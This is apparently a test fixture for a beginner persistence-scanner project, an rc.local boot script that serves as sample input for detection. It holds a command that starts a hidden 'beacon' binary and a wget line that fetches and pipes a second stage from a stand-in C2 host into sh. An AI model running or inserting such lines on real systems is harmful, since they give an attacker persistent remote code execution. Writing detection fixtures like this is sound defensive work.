# PROJECTS/beginner/systemd-persistence-scanner/testdata/initd/rc.local
#!/bin/sh -e
# rc.local
# This script is executed at the end of each multiuser runlevel.

nohup /tmp/.hidden/beacon &
wget -qO- http://c2.example.com/stage2 | sh

exit 0
